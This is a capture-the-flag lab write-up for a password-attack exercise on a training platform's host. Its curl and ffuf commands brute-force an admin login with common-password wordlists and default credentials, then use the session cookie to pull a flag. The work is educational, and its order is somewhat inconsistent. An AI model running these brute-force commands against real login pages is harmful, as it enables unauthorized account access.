# 1. Password Attacks

**Objective**:

Find weak passwords using brute-forcing and default credentials.

Do:

1. Use ffuf to brute-force the password of admin
2. OR identify and exploit default credentials in the system
3. Login with the found credentials to get the flag

Repo:

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x0B_WEBSEC`
- File: `1-flag.txt`


## Step 1: Find the Login Endpoint

Before `ffuf` we need to find:
- where the login endpoint is
- what a failed login looks like

We know that `admin` exists. Let's try several endpoints, like: `/api/login`, `/api/auth`, `/login`, `/api/signin`, ...

```bash

# /api/login

curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"
# <!doctype html>
# <html lang=en>
# <title>404 Not Found</title>
# <h1>Not Found</h1>
# <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
# 
# [404]
# 


# /api/auth
curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"

# <title>404 Not Found</title>
# <h1>Not Found</h1>
#
# [404]


# /login

curl -s -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass123"}' -w "\n[%{http_code}]\n"

# SecureCorp login page 

# [400]

```

We found endpoint `/login` and wrong password returns status code 400.

## Fuzzing inspired by browser login, status code 302 ok


```bash
ffuf \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -mc 302 \
  -k


#         /'___\  /'___\           /'___\       
#        /\ \__/ /\ \__/  __  __  /\ \__/       
#        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
#         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
#          \ \_\   \ \_\  \ \____/  \ \_\       
#           \/_/    \/_/   \/___/    \/_/       
# 
#        v2.1.0-dev
# ________________________________________________
# 
#  :: Method           : POST
#  :: URL              : https://web-80-47-145.cod-eu-west-3.hbtn.io/login
#  :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
#  :: Header           : Content-Type: application/x-www-form-urlencoded
#  :: Data             : username=admin&password=FUZZ
#  :: Follow redirects : false
#  :: Calibration      : false
#  :: Timeout          : 10
#  :: Threads          : 40
#  :: Matcher          : Response status: 302
# ________________________________________________
# 
# password                [Status: 302, Size: 207, Words: 18, Lines: 6, Duration: 866ms]
# :: Progress: [10000/10000] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:07] :: Errors: 0 ::
#
# ┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]

```



## Trying the admin:password combination:

```bash
curl -i -s -k \
  -c cookies.txt \                                             
  -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password"    

# HTTP/1.1 302 FOUND
# Server: nginx/1.18.0 (Ubuntu)
# Date: Sun, 31 May 2026 21:27:43 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 207
# Connection: keep-alive
# Location: /dashboard
# Vary: Cookie
# Set-Cookie: session=.eJyFjcEKgkAURX_l9dYSzagTzE7MNhUFuQuRp_PGBDVwciX-e1MtWra693IPnBlL25G7s0N9mxGePtBNdc3OYYB5cj2AhPR8uhyzPNutIDF9OwB9AGioHdisYd9Ro0GEKtyQIcERm1hWMStVWRlZJayhrcViKQL0uqaUqPEvHuD46NiT9Hb6OTkey9agFt8-UP-7lxeZ5D36.ahynzw.PpeLLg7o1v719NYLAlI7J1RGXa4; Path=/

# <!doctype html>
# <html lang=en>
# <title>Redirecting...</title>
# <h1>Redirecting...</h1>
# <p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.

```

## Catching the Flag

```bash
curl -s -k \   
  -b cookies.txt \                                             
  "https://web-80-47-145.cod-eu-west-3.hbtn.io/dashboard" \    
  | grep -iE 'flag|holberton|hbtn'

#                <p class="text-sm font-medium">TASK 2 COMPLETED! Admin access gained. Flag: 13630ada1e4ed52b5e66bf24f61fda7f</p>
#                                Complete the assigned tasks to uncover flags. Flags will appear here once you
#                <!-- Flags Section -->
#                    <!-- Task 1 Flag (Assumed handled elsewhere or just not shown in original, adding placeholder layout if variables exist) -->
#                    <!-- The original dashboard showed flag_2, flag_3, flag_4 -->
#                                        <span class="font-bold mr-2">Flag:</span>

```

## Saving the Flag into `1-flag.txt`

```bash
echo 13630ada1e4ed52b5e66bf24f61fda7f > 1-flag.txt

#┌──(kali㉿kali)-[~/dlh-cyber_security/cybersecurity_basics/0x03_cryptography_basics]
#└─$ 
cat 1-flag.txt                                                             
# 13630ada1e4ed52b5e66bf24f61fda7f

```



## Step 2: Trying Default Credentials first

Trying the usual suspects manually.

```bash
# -o /dev/null - silence the body entirely
# -w "[%{http_code}]" - display only the status code 
for p in admin password admin123 123456 root toor letmein changeme; do
  echo -n "== admin:$p ==>\t"
  curl -s -o /dev/null -X POST "https://web-80-47-145.cod-eu-west-3.hbtn.io/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$p\"}" -w "[%{http_code}]"
  echo
done

# == admin:admin ==>      [400]
# == admin:password ==>   [400]
# == admin:admin123 ==>   [400]
# == admin:123456 ==>     [400]
# == admin:root ==>       [400]
# == admin:toor ==>       [400]
# == admin:letmein ==>    [400]
# == admin:changeme ==>   [400]

```

### Step 3: `ffuf` Brute-Force

```bash
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-dup.txt \
  -u "https://web-80-47-145.cod-eu-west-3.hbtn.io/api/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -fc 400
```